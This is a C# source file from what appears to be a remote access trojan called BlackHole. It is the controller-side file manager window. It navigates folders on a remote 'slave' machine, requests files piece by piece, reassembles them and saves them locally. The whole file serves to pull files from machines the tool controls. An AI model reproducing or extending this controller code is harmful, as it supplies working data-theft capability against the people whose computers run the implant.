using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using BlackHole.Master.Model;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;

namespace BlackHole.Master
{
    /// <summary>
    /// 
    /// </summary>
    public partial class FileManager : ISlaveWindow
    {
        /// <summary>
        /// 
        /// </summary>
        public ViewModel<FileMeta> ViewModelFiles
        {
            get;
            private set;
        }

        /// <summary>
        /// 
        /// </summary>
        public ViewModel<FileDownload> ViewModelDownloads
        {
            get;
            private set;
        }

        /// <summary>
        /// 
        /// </summary>
        public int SlaveId
        {
            get
            {
                return m_slave.Id;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        private Slave m_slave;

        /// <summary>
        /// 
        /// </summary>
        private int m_nextDownloadId;

        /// <summary>
        /// 
        /// </summary>
        /// <param name="slave"></param>
        public FileManager(Slave slave) : this()
        {
            m_slave = slave;

            TargetStatusBar.DataContext = slave;

            DownloadsList.DataContext = ViewModelDownloads = new ViewModel<FileDownload>();
            FilesList.DataContext = ViewModelFiles = new ViewModel<FileMeta>();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="folder"></param>
        private void NavigateToFolder(string folder)
        {
            m_slave.Send(new NavigateToFolderMessage()
            {
                Path = Path.Combine(TxtBoxDirectory.Text, folder)
            });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="path"></param>
        private void DownloadFile(string name)
        {
            m_slave.Send(new DownloadFilePartMessage()
            {
                Id = m_nextDownloadId++,
                CurrentPart = 0,
                Path = Path.Combine(TxtBoxDirectory.Text, name)
            });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ev"></param>
        public async void OnEvent(SlaveEvent ev)
        {
            await this.ExecuteInDispatcher(() =>
            {
                switch((SlaveEventType)ev.EventType)
                {
                    case SlaveEventType.DISCONNECTED:
                        MessageBox.Show("Slave disconnected", "Information", MessageBoxButton.OK, MessageBoxImage.Information);
                        Close();
                        break;

                    case SlaveEventType.INCOMMING_MESSAGE:
                        ev.Data
                            .Match()
                            .With<FolderNavigationMessage>(m =>
                            {
                                TxtBoxDirectory.Text = m.Path;
                                ViewModelFiles.Items.Clear();
                                m.Files.ForEach(ViewModelFiles.Items.Add);
                            })
                            .With<StatusUpdateMessage>(m =>
                            {
                                TargetStatus.Content = m.Operation;
                                TargetStatusTooltipTitle.Text = m.Operation;
                                TargetStatusTooltipMessage.Text = m.Message;
                                if (!m.Success)
                                {
                                    TargetStatusTooltip.PlacementTarget = TargetStatus;
                                    TargetStatusTooltip.IsOpen = true;
                                    Dispatcher.DelayInvoke(TimeSpan.FromMilliseconds(4000), () =>
                                    {
                                        TargetStatusTooltip.IsOpen = false;
                                    });
                                }
                            })
                            .With<DownloadedFilePartMessage>(m =>
                            {
                                var model = ViewModelDownloads.Items.FirstOrDefault(mod => mod.Id == m.Id);
                                if (model == null)
                                {
                                    model = new FileDownload(m.Id, m.Path);
                                    ViewModelDownloads.Items.Add(model);
                                }

                                model.OnPartDownloaded(m);

                                if(model.DownloadCompleted)
                                {
                                    m_slave.SaveDownloadedFile(model.Name, model.RawFile.ToArray());
                                    Dispatcher.DelayInvoke(TimeSpan.FromMilliseconds(2000), () =>
                                    {
                                        ViewModelDownloads.Items.Remove(model);
                                    });
                                }
                                else
                                {
                                    // get the next chunck
                                    m_slave.Send(new DownloadFilePartMessage()
                                    {
                                        Id = model.Id,
                                        Path = model.FilePath,
                                        CurrentPart = m.CurrentPart + 1
                                    });
                                }
                            });                        
                        break;
                }
            });
        }
    }
}
